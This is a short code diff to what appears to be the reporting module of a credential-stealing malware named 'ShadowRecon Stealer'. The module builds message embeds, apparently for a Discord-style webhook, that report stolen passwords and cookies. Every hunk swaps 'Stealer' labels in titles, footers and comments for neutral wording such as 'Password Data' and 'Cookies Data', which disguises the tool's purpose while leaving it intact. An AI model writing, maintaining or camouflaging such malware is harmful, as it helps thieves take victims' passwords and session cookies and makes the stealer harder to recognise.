@@ -287,7 +287,7 @@ class Statistics {
                     icon_url: avatarUrl
                 },
                 footer: {
-                    text: "ShadowRecon Stealer"
+                    text: "ShadowRecon"
                 },
                 timestamp: timestamp,
                 thumbnail: {
@@ -296,7 +296,7 @@ class Statistics {
             },
             // Second embed - Password stealer
             {
-                title: "ShadowRecon | Password Stealer",
+                title: "ShadowRecon | Password Data",
                 color: null,
                 fields: [
                     {
@@ -309,13 +309,13 @@ class Statistics {
                     }
                 ],
                 footer: {
-                    text: "ShadowRecon Stealer"
+                    text: "ShadowRecon"
                 },
                 timestamp: timestamp
             },
-            // Third embed - Cookies stealer
+            // Third embed - Cookies data
             {
-                title: "ShadowRecon | Cookies Stealer",
+                title: "ShadowRecon | Cookies Data",
                 color: null,
                 fields: [
                     {
@@ -328,7 +328,7 @@ class Statistics {
                     }
                 ],
                 footer: {
-                    text: "ShadowRecon Stealer"
+                    text: "ShadowRecon"
                 },
                 timestamp: timestamp
             }
